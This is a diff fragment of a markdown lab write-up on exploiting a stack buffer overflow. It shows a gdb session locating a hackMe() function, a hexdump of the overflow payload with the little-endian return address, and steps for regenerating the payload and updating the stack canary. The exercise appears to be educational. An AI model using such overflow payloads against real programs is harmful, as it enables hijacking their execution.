@@ -159,14 +159,14 @@ File [payload.bin] not found
 Warning: not running
 ```
 
-# 6.2 hackMe() return address
+## 6.2 'hackMe()' return address
 ```bash
 gdb-peda$ info address hackMe
 Symbol "hackMe" is at 0x804860b in a file compiled without debugging.
 ```
 In little-endian: 0x0b860408
 
-# 6.3 Payload
+## 6.3 Payload
 ```bash
 $ hexdump -C payload.bin
 00000000  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|
@@ -175,6 +175,8 @@ $ hexdump -C payload.bin
 00000030  0b 86 04 08 0a                                    |.....|
 00000035
 ```
+
+Add these values to the `payload.pl` file in reverse orden (little endian).
 
 # 7. Attack
 Run the program:
@@ -187,7 +189,7 @@ How many bytes should I read from your payload.bin?
 
 ```
 
-Generate the payload, remember to update the canary value:
+Generate the payload, remember to update the canary value in `payload.pl`:
 ```bash
 $ perl payload.pl > payload.bin
 $ hexdump -C payload.bin
